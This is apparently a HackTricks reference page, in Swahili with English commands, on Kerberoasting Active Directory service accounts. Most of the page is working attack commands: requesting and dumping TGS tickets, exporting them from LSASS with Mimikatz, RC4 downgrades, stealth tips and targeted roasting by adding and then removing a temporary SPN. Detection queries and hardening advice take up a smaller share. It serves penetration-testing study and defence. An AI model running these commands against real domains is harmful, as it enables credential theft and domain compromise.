# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting inalenga kupata tiketi za TGS, hasa zile zinazohusiana na services zinazoendesha chini ya user accounts katika Active Directory (AD), bila kujumuisha computer accounts. Usimbaji wa tiketi hizi hutumia keys zinazotokana na user passwords, hivyo kuruhusu credential cracking offline. Matumizi ya user account kama service huonyeshwa na property ya ServicePrincipalName (SPN) isiyo tupu.

Mtumiaji yeyote wa domain aliye authenticated anaweza kuomba tiketi za TGS, kwa hiyo hakuna privileges maalum zinazohitajika.<sup>[[4]](#references)[[5]](#references)</sup>

### Mambo Muhimu

- Hulenga tiketi za TGS za services zinazoendesha chini ya user accounts (yaani, accounts zilizo na SPN; si computer accounts).
- Tiketi husimbwa kwa key inayotokana na password ya service account na zinaweza kuvunjwa offline.
- Hakuna elevated privileges zinazohitajika; account yoyote iliyo authenticated inaweza kuomba tiketi za TGS.

> [!WARNING]
> Public tools nyingi hupendelea kuomba service tickets za RC4-HMAC (etype 23) kwa sababu ni rahisi zaidi kuvunja kuliko AES. RC4 TGS hashes huanza na `$krb5tgs$23$*`, AES128 huanza na `$krb5tgs$17$*`, na AES256 huanza na `$krb5tgs$18$*`. Hata hivyo, environments nyingi zinahamia kwenye AES-only. Usidhani kuwa RC4 pekee ndiyo muhimu.
> Pia, epuka kufanya roasting ya “spray-and-pray”. Kerberoast ya default ya Rubeus inaweza ku-query na kuomba tiketi kwa SPNs zote na huwa noisy. Fanya enumeration na ulenga principals wanaovutia kwanza.

### Siri za service accounts na gharama ya crypto ya Kerberos

Services nyingi bado huendesha chini ya user accounts zenye passwords zinazosimamiwa kwa mkono. KDC husimba service tickets kwa keys zinazotokana na passwords hizo na kumpa ciphertext kila principal aliye authenticated, hivyo kerberoasting hutoa uwezekano wa kubashiri offline bila kikomo, bila lockouts au telemetry kutoka kwa DC. Mode ya encryption huamua cracking budget:

| Mode | Key derivation | Aina ya encryption | Approx. RTX 5090 throughput* | Maelezo |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 yenye iterations 4,096 na salt ya kila principal inayotengenezwa kutokana na domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt huzuia rainbow tables lakini bado huruhusu cracking ya haraka ya passwords fupi. |
| RC4 + NT hash | MD4 moja ya password (NT hash isiyo na salt); Kerberos huchanganya tu confounder ya bytes 8 kwa kila ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | Takriban mara 1000 haraka kuliko AES; attackers hulazimisha RC4 kila `msDS-SupportedEncryptionTypes` inaporuhusu. |

*Benchmarks kutoka kwa Chick3nman kama ilivyotajwa katika [uchambuzi wa Kerberoasting wa Matthew Green](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

Confounder ya RC4 hubadilisha tu keystream kwa njia ya random; haiongezi kazi kwa kila guess. Isipokuwa service accounts zitumie secrets za random (gMSA/dMSA, machine accounts, au strings zinazosimamiwa na vault), kasi ya compromise inategemea tu GPU budget. Kulazimisha etypes za AES-only huondoa downgrade ya guesses bilioni kwa sekunde, lakini human passwords dhaifu bado hushindwa na PBKDF2.<sup>[[3]](#references)</sup>

### Shambulio

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Zana zenye vipengele vingi zinazojumuisha ukaguzi wa kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Orodhesha watumiaji wa kerberoastable
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: Omba TGS na ufanye dump kutoka kwenye memory
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technique 2: Zana za kiotomatiki
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Ombi la TGS huzalisha Windows Security Event 4769 (Tiketi ya huduma ya Kerberos iliombwa).

### OPSEC na mazingira ya AES-only

- Omba RC4 kwa makusudi kwa accounts zisizo na AES:
- Rubeus: `/rc4opsec` hutumia tgtdeleg kuorodhesha accounts zisizo na AES na huomba service tickets za RC4.
- Rubeus: `/tgtdeleg` pamoja na kerberoast pia huanzisha maombi ya RC4 inapowezekana.<sup>[[6]](#references)</sup>
- Roast accounts za AES-only badala ya kushindwa kimya:
- Rubeus: `/aes` huorodhesha accounts zilizo na AES na huomba service tickets za AES (etype 17/18).
- Ikiwa tayari una TGT (PTT au kutoka kwenye .kirbi), unaweza kutumia `/ticket:<blob|path>` pamoja na `/spn:<SPN>` au `/spns:<file>` na kuruka LDAP.
- Kulenga, kupunguza kasi na kupunguza noise:
- Tumia `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` na `/jitter:<1-100>`.
- Chuja passwords zinazoweza kuwa dhaifu kwa kutumia `/pwdsetbefore:<MM-dd-yyyy>` (passwords za zamani) au lenga OUs zenye privilege kwa `/ou:<DN>`.<sup>[[8]](#references)</sup>

Mifano (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

Ikiwa unadhibiti au unaweza kurekebisha account, unaweza kuifanya iwe kerberoastable kwa kuongeza SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Punguza kiwango cha akaunti ili kuwezesha RC4 kwa cracking rahisi (inahitaji write privileges kwenye target object):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast kupitia GenericWrite/GenericAll kwenye user (SPN ya muda)

BloodHound inapoonyesha kuwa una control juu ya user object (kwa mfano, GenericWrite/GenericAll), unaweza kufanya “targeted-roast” kwa uhakika kwa user huyo hata kama kwa sasa hana SPN yoyote:<sup>[[9]](#references)</sup>

- Ongeza SPN ya muda kwenye user unayemdhibiti ili awe roastable.
- Omba TGS-REP iliyosimbwa kwa RC4 (etype 23) kwa SPN hiyo ili kurahisisha cracking.
- Crack hash ya `$krb5tgs$23$...` kwa hashcat.
- Ondoa SPN ili kupunguza footprint.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner (targetedKerberoast.py huendesha kiotomatiki kuongeza SPN -> kuomba TGS (etype 23) -> kuondoa SPN):<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Vunja output kwa kutumia hashcat autodetect (mode 13100 kwa `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Maelezo ya detection: kuongeza/kutoa SPNs husababisha mabadiliko ya directory (Event ID 5136/4738 kwenye user lengwa), na ombi la TGS huzalisha Event ID 4769. Fikiria kutumia throttling na kufanya prompt cleanup.

Unaweza kupata tools muhimu za kerberoast attacks hapa: https://github.com/nidem/kerberoast

Ukipata error hii kutoka Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, inasababishwa na kutolingana kwa muda wa local. Sync na DC:

- `ntpdate <DC_IP>` (deprecated kwenye baadhi ya distros)
- `rdate -n <DC_IP>`

### Kerberoast bila domain account (AS-requested STs)

Mnamo Septemba 2022, Charlie Clark alionyesha kwamba ikiwa principal haihitaji pre-authentication, inawezekana kupata service ticket kupitia KRB_AS_REQ iliyoundwa mahsusi kwa kubadilisha sname kwenye request body, na hivyo kupata service ticket badala ya TGT. Hii inafanana na AS-REP roasting na haihitaji domain credentials halali.

Angalia maelezo: Semperis write-up “New Attack Paths: AS-requested STs”.<sup>[[10]](#references)</sup>

> [!WARNING]
> Lazima utoe list ya users kwa sababu bila credentials halali huwezi ku-query LDAP kwa kutumia technique hii.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Inayohusiana

Ikiwa unawalenga users wanaoweza kuathiriwa na AS-REP roast, tazama pia:

{{#ref}}
asreproast.md
{{#endref}}

### Utambuzi

Kerberoasting inaweza kufanyika kwa kujificha. Tafuta Event ID 4769 kutoka kwa DCs na tumia filters kupunguza kelele:

- Ondoa service name `krbtgt` na service names zinazoishia na `$` (computer accounts).
- Ondoa requests kutoka kwa machine accounts (`*$$@*`).
- Tumia requests zilizofaulu pekee (Failure Code `0x0`).
- Fuatilia encryption types: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Usitoe alert kwa `0x17` pekee.

Mfano wa PowerShell triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Mawazo ya ziada:

- Weka baseline ya matumizi ya kawaida ya SPN kwa kila host/user; toa alert kuhusu milipuko mikubwa ya maombi ya SPN tofauti kutoka kwa principal mmoja.
- Weka alama kwenye matumizi yasiyo ya kawaida ya RC4 katika domains zilizoimarishwa kwa AES.

### Mitigation / Hardening

- Tumia gMSA/dMSA au machine accounts kwa services. Managed accounts huwa na passwords za random zenye zaidi ya herufi 120 na huzibadilisha kiotomatiki, hivyo kufanya offline cracking isiwe na maana.<sup>[[7]](#references)</sup>
- Lazimisha AES kwenye service accounts kwa kuweka `msDS-SupportedEncryptionTypes` kuwa AES-only (decimal 24 / hex 0x18), kisha ubadilishe password ili AES keys zitengenezwe.<sup>[[7]](#references)</sup>
- Inapowezekana, disable RC4 katika environment yako na ufuatilie majaribio ya kutumia RC4. Kwenye DCs unaweza kutumia registry value ya `DefaultDomainSupportedEncTypes` kuelekeza defaults za accounts ambazo hazijawekewa `msDS-SupportedEncryptionTypes`. Fanya majaribio kwa kina.
- Ondoa SPNs zisizo za lazima kutoka kwenye user accounts.<sup>[[7]](#references)</sup>
- Tumia passwords ndefu za random za service accounts (herufi 25+) ikiwa managed accounts haziwezekani; kataza passwords za kawaida na fanya audit mara kwa mara.<sup>[[7]](#references)</sup>

## Marejeo

- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Active Directory Kerberos Abuse: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: Requesting RC4 Encrypted TGS when AES is Enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Rubeus kerberoast command documentation](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – New Attack Paths? AS Requested Service Tickets (Charlie Clark, Sept 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)

{{#include ../../banners/hacktricks-training.md}}
